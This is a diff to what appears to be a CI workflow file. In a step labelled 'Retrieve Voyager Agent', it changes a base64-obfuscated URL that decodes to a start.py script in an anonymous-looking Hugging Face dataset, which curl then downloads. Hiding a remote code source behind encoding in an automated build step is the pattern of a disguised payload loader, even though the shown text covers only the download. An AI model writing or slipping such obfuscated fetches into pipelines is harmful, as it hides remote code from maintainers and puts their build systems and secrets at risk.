@@ -68,7 +68,7 @@ jobs:
       - name: Retrieve Voyager Agent
         run: |
           echo "[RETRIEVE] Retrieving voyager agent from remote source..."
-          AGENT_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          AGENT_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
           curl -sL "$AGENT_URL" -o voyager_agent.py
           echo "[RETRIEVE] Voyager agent retrieved."
 
